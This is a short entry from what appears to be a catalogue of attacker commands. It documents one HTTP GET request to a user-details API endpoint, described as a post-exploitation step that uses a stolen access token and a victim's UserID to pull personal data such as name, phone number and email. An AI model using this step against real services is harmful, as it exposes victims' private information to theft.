---
data: GET /v2/userdetails.json/<USERID> HTTP/1.1
tags:
  - api-query
  - pii-leak
type: command
executor: bash
platforms:
  - Web
id: 7739f617-d10a-4b10-913e-faf9e14bfad0
created_at: '2025-12-11T06:10:24.203Z'
updated_at: '2025-12-11T06:10:24.203Z'
verified: false
validated: true
submitted: true
---
# get-userdetails

## Command

```bash
GET /v2/userdetails.json/<USERID> HTTP/1.1
```

## Description

Accesses victim PII using Access-Token and UserID, used post-exploitation to leak PII.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<USERID>` | Victim's UserID | Yes |

## Examples

### Basic Usage

```bash
GET /v2/userdetails.json/<USERID> HTTP/1.1
```

## Expected Output

Victim's first/last name, phone number, email, etc.

## Related

- [[procedures/Retrieve-UserID-and-PII-with-Stolen-Token]]
- [[commands/get-userid]]
